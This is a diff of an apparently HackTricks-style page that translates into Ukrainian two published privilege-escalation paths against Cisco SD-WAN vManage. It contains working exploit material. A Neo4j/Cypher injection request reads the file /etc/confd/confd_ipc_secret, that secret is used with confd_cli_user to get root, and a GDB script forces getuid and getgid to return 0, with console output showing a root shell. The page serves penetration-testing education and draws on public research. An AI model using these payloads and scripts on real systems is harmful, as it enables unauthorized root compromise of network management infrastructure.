@@ -4,18 +4,15 @@
 
 ## Path 1
 
-(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
+(Приклад з [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
-
+Після деякого дослідження [документації](http://66.218.245.39/doc/html/rn03re18.html), пов'язаної з `confd` та різними бінарними файлами (доступними з обліковим записом на сайті Cisco), ми виявили, що для автентифікації IPC сокета використовується секрет, розташований у `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-
-Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
-
+Пам'ятаєте наш екземпляр Neo4j? Він працює під привілеями користувача `vmanage`, що дозволяє нам отримати файл, використовуючи попередню вразливість:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -27,9 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-
-The `confd_cli` program does not support command line arguments but calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:
-
+Програма `confd_cli` не підтримує аргументи командного рядка, але викликає `/usr/bin/confd_cli_user` з аргументами. Отже, ми можемо безпосередньо викликати `/usr/bin/confd_cli_user` з нашим власним набором аргументів. Однак вона недоступна для читання з нашими поточними привілеями, тому нам потрібно отримати її з rootfs і скопіювати за допомогою scp, прочитати допомогу та використовувати її для отримання оболонки:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -47,15 +42,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-
 ## Path 2
 
-(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(Приклад з [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-The blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.
+Блог¹ команди synacktiv описав елегантний спосіб отримати root shell, але є застереження: потрібно отримати копію `/usr/bin/confd_cli_user`, яка доступна лише для читання root. Я знайшов інший спосіб підвищити привілеї до root без таких труднощів.
 
-When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
-
+Коли я розібрав бінарний файл `/usr/bin/confd_cli`, я спостерігав наступне:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -84,46 +77,40 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-
-When I run “ps aux”, I observed the following (_note -g 100 -u 107_)
-
+Коли я запускаю “ps aux”, я спостерігав наступне (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
+Я припустив, що програма “confd_cli” передає ідентифікатор користувача та ідентифікатор групи, які вона отримала від увійшовшого користувача, додатку “cmdptywrapper”.
 
-I hypothesized the “confd_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
+Моя перша спроба полягала в тому, щоб запустити “cmdptywrapper” безпосередньо і передати йому `-g 0 -u 0`, але це не вдалося. Схоже, що десь на шляху був створений дескриптор файлу (-i 1015), і я не можу його підробити.
 
-My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.
+Як згадувалося в блозі synacktiv (останній приклад), програма `confd_cli` не підтримує аргументи командного рядка, але я можу вплинути на неї за допомогою налагоджувача, і на щастя, GDB включено в систему.
 
-As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.
-
-I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
+Я створив скрипт GDB, в якому змусив API `getuid` і `getgid` повертати 0. Оскільки я вже маю привілей “vmanage” через десеріалізацію RCE, я маю дозвіл на безпосереднє читання `/etc/confd/confd_ipc_secret`.
 
 root.gdb:
-
 ```
 set environment USER=root
 define root
-   finish
-   set $rax=0
-   continue
+finish
+set $rax=0
+continue
 end
 break getuid
 commands
-   root
+root
 end
 break getgid
 commands
-   root
+root
 end
 run
 ```
-
-Console Output:
-
+Вихід консолі:
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -157,5 +144,4 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
